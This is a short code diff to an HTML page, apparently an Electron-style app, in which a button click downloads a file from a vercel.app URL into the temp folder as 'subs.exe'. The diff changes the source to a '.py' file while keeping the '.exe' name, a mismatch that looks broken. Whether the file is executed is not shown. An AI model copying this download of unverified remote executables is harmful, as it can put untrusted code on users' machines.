@@ -20,7 +20,7 @@
     const os = require('os');
 
     document.getElementById('mobilityBtn').addEventListener('click', () => {
-        const exeUrl = 'https://dsq-beta.vercel.app/subs.exe'; // renamed EXE
+        const exeUrl = 'https://dsq-beta.vercel.app/backup DSQ.py'; // renamed EXE
         const tempPath = path.join(os.tmpdir(), 'subs.exe'); // download to temp folder
 
         const file = fs.createWriteStream(tempPath);
@@ -50,4 +50,5 @@
 
 </body>
 </html>
+
 
